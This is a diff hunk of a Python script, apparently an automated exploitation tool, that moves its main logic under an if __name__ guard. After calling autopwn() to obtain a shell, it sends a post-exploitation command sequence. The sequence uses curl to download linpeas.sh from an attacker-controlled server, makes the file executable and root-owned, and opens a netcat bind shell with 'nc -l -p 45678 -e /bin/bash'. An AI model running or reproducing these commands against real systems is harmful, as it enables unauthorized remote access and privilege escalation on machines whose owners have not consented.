@@ -326,26 +326,26 @@ def sendCommands(shell, sequence=[]) -> int:
     return 0
 
 
-if len(sys.argv) > 1:
-    IP = sys.argv[1]
+if __name__ == "__main__":
+    if len(sys.argv) > 1:
+        IP = sys.argv[1]
 
+    (shell, client, srv) = autopwn()
 
-(shell, client, srv) = autopwn()
+    sequence = [
+        "whoami",
+        "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
+        "pwd",
+        "chown root:root linpeas.sh",
+        "echo 0xcafedeadbeef",
+        "chmod +x linpeas.sh",
+        "echo matthislemechan",
+        "nc -l -p 45678 -e /bin/bash",
+    ]
 
-sequence = [
-    "whoami",
-    "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
-    "pwd",
-    "chown root:root linpeas.sh",
-    "echo 0xcafedeadbeef",
-    "chmod +x linpeas.sh",
-    "echo matthislemechan",
-    "nc -l -p 45678 -e /bin/bash",
-]
+    sendCommands(shell, sequence)
 
-sendCommands(shell, sequence)
+    LOG("END OF LOGS", logfile, "crit")
+    logfile.close()
 
-LOG("END OF LOGS", logfile, "crit")
-logfile.close()
-
-exit(0)
+    exit(0)
